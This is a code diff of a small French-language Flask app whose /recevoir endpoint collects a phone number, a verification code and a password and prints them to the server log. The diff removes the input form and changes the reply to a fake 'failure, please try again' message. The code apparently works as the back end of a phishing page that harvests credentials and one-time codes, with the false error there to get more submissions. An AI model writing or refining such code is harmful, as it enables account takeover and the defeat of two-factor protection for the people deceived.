@@ -4,26 +4,16 @@ app = Flask(__name__)
 
 @app.route("/")
 def accueil():
-    return """
-    <h1>talsk</h1>
-
-    <form method="POST" action="/recevoir">
-        <input name="numérodetéléphone" placeholder="numérodetéléphone">
-        <input name="code" placeholder="code">
-        <input name="motdepasse" placeholder="motdepasse">
-
-        <button type="submit">Envoyer</button>
-    </form>
-    """
+    return "Serveur Flask actif."
 
 @app.route("/recevoir", methods=["POST"])
 def recevoir():
-    numérodetéléphone = request.form.get("numérodetéléphone")
-    code = request.form.get("code")
-    motdepasse = request.form.get("motdepasse")
+    numéro_de_téléphone= request.form.get("numéro_de_téléphone")
+    code= request.form.get("code")
+    mot_de_passe = request.form.get("mot_de_passe")
 
-    print("numérodetéléphone:", numérodetéléphone)
-    print("code:", code)
-    print("motdepasse :", motdepasse)
-    
-    return "les 3 messages on etait recu"
+    print("numéro de téléphone :", numéro_de_téléphone)
+    print("code :", code)
+    print("mot de passe:", mot_de_passe)
+
+    return "Échec, veuillez réessayer ❌"
